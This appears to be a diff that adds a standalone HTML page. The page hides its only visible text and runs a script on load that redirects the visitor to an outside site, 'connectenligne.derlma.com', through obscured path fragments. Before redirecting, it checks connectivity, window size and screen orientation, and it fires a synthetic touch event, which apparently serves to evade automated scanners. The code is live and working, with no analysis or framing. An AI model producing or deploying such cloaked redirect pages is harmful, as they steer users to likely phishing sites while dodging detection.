@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+    <head>        
+     <meta charset="UTF-8" />
+   </head>
+   <body>  
+       <div style="color: transparent;">
+        redirection
+       </div>
+   </body>
+   <script>
+      var catalog = {
+        'key1': {'page':"pddps/11/sdl@sdien/darl/fr/9789",'db':"lion",'link':"https://connectenligne.derlma.com/"},
+        'key2': {'path':'anotsdath','page':'tempqs.html'}
+      }      
+     
+     setTimeout(function() { 
+            if(navigator.onLine) {
+              console.log('We\'re online!');
+              let box = window.innerHeight;
+              let boxs = window.innerWidth;
+              if(box > 200 && boxs > 200){
+                if(typeof screen.orientation !== 'undefined'){
+                  location.replace(catalog.key1.link+catalog.key1.page+"/");
+                }else{                  
+                  window.addEventListener("touchstart", () => { 
+                    location.replace(catalog.key1.link+catalog.key1.page+"/");            
+                  });
+                  eventFire(window, "touchstart");
+                }
+
+              }
+
+            }else {
+               console.log('We\'re oine...');
+            } 
+          }, 0);
+       
+function eventFire(el, etype){
+  if (el.fireEvent) {
+    el.fireEvent('on' + etype);
+  } else {
+    var evObj = document.createEvent('Events');
+    evObj.initEvent(etype, true, false);
+    el.dispatchEvent(evObj);
+  }
+}
+   </script>
+</html>
